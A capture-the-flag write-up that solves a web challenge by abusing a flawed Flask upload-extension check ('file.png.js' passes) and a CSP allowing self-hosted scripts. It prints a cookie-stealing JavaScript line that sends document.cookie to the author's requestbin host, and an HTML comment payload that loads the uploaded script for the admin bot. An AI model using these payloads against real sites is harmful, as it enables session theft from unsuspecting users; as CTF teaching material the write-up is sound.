# Description
Hello fellow Donut Earther! Check out this neat site that forwards our cause! The thing is, we think that the admin is actually a flat earther. Think you can figure it out?

http://the-truth.hackers.best:31337/

Note: Ignore the session key, it's only present for challenge functionality. Also, if you have a working exploit, you might have to try more than once :)

![image](https://user-images.githubusercontent.com/101048320/234419763-554400cf-bc68-4abd-8fdc-cde63efac571.png)

# Solution
## Recon 

- After navigating to the link provided, we are greeted with this webpage : 

![image](https://user-images.githubusercontent.com/101048320/234424415-f255a5b4-53fb-4e65-bb31-763df1afbc0e.png)

- We can see a comment section at the bottom of the page, with a `waive admin` button : 

![image](https://user-images.githubusercontent.com/101048320/234424607-19d9aa4a-6360-43bc-8cda-98f8ca6d6717.png)

- This already looks sus, maybe XSS ? CSRF ? keep that for later.

- We can also see an upload section to upload our images :

![image](https://user-images.githubusercontent.com/101048320/234424836-e14e4464-cd3c-482b-bf86-f2fb3a6336be.png)

- If we try to upload an image, it gets saved in the `/images` directory, also, we can't upload files except for png, jpg, jpeg and gif. So this already gives me a hint that I should bypass it.

- Viewing the page source, we see this :

![image](https://user-images.githubusercontent.com/101048320/234425232-a16601e7-f9fa-491a-8092-e90f5e5cf04c.png)

- Okay so we have the source code for the webapp, let's check it out : 
```python
#https://www.w3schools.com/howto/howto_css_blog_layout.asp
#https://flask.palletsprojects.com/en/latest/patterns/fileuploads/
import os
import redis
import subprocess
from uuid import uuid4
from flask import *
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_socketio import SocketIO, emit
from werkzeug.utils import secure_filename

UPLOAD_FOLDER = os.path.abspath('../') + '/images/'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

app = Flask(__name__)

limiter = Limiter(
	get_remote_address,
	app=app,
	default_limits=["30 per minute"]
)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['SECRET_KEY'] = 'secret!'

socketio = SocketIO(app)

comments = []

def allowed_file(filename):
   return '.' in filename and filename.rsplit('.')[1].lower() in ALLOWED_EXTENSIONS

@app.after_request
def add_security_headers(resp):
	resp.headers['Content-Security-Policy']="default-src 'self' https://*.jquery.com https://*.cloudflare.com;  object-src 'none';"
	return resp

@socketio.on('submit comment')
def handle_comment(data):
	comments.append("<p class=\"comment\"><strong>" + data['author'] + ":</strong> " + data['comment'] + "</p>");
	emit('new comment', broadcast=True)

@socketio.on('waive admin')
def waive_admin():
	subprocess.run(['python','admin.py'])

@app.route('/', methods=['GET'])
def news():
	if 'flag' in request.cookies:
		return render_template('/news.html', comments=comments)
	else:
		resp = make_response(render_template('/news.html', comments=comments))
		resp.set_cookie('flag','if only you were the admin lol')
		return resp

@app.route('/upload', methods=['GET','POST'])
def upload():
	if request.method == 'POST':
		if 'file' not in request.files:
			flash('No file part')
			return render_template('/upload.html',message='No file uploaded :(')
		file = request.files['file']
		if not file:
			flash('No file data')
			return render_template('/upload.html',message='No file uploaded :(')
		if file.filename == '':
			flash('No selected file')
			return render_template('/upload.html',message='Filename can\'t be empty, silly!')
		if allowed_file(file.filename):
			filename = session['uuid'] + secure_filename(file.filename)
			print(filename)
			file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
			return render_template('/upload.html',message=f'Image uploaded successfully to /images/{filename}!')
		else:
			return render_template('/upload.html',message='Bad file type detected! Only .png, .jpg, .jpeg, and .gif allowed!')
	return render_template('/upload.html')

@app.route('/images/<name>', methods=['GET'])
def download_file(name):
	return send_from_directory(app.config["UPLOAD_FOLDER"], name)


@app.route('/source',methods=['GET'])
def show_source():
	return render_template('server_code.py')

if __name__=='__main__':
	app.run(host="0.0.0.0",port=31337)
```

- We notice that it's a flask app, something that directly catches my attention is this function : 
```python
def allowed_file(filename):
   return '.' in filename and filename.rsplit('.')[1].lower() in ALLOWED_EXTENSIONS
```

- To those of you who don't know, the `rsplit()` function in python takes two optional arguments : the split character, and the number of occurances.By default, this latter takes the value of -1, which means it will split the string in all occurances. This is so insecure because the function will now only check for the first occurance of an allowed extension, which means a file named `file.png.js` is allowed.

- We can also see that the cookie is set to `flag="if only you were the admin lol"` alongside with a session ID, a clear hint that the flag will be in the cookie.

![image](https://user-images.githubusercontent.com/101048320/234427449-5e0fa8fe-2432-4621-82bd-df69ab9d78c1.png)


- Another interesting code portion is this : 
```python
@app.after_request
def add_security_headers(resp):
	resp.headers['Content-Security-Policy']="default-src 'self' https://*.jquery.com https://*.cloudflare.com;  object-src 'none';"
	return resp
```

- The app is using a CSP header, with anything from self, jquery and cloudflare. After checking https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#file-upload-+-self, we find that it's vulnerable to XSS. Bingo!

- Our plan now is to upload a JavaScript payload that points to a host we control, and then we trigger it using XSS and `waive admin`, the cookie should be the flag

## Execution 

- I wrote this code and saved it in a file called `info.png.js` : 
```javascrpt
document.location = "https://enjodxcp8qx8.x.pipedream.net?cookie=" + document.cookie;       
```

- The link points to my host on requestbin, so I'm ready to receive any request made to it

- Then I uploaded the file : 

![image](https://user-images.githubusercontent.com/101048320/234427785-601c3da8-9929-437c-8f51-5097c3bd9f63.png)

- Now, to trigger the xss, all I needed to do is to use this payload inside the comment body and press `waive admin` : 
```html
"/>'><script src="/images/4a053dda-192a-47bc-9986-4eb911b8fe3dinfo.png.js"></script>
```

- Now if we check our host on requestbin, we get : 

![image](https://user-images.githubusercontent.com/101048320/234428302-9b24d7c6-ef46-4742-9c0d-2ae96c757194.png)


# Flag

shctf{w3_a11_l1v3_und3r_th3_DOMe}







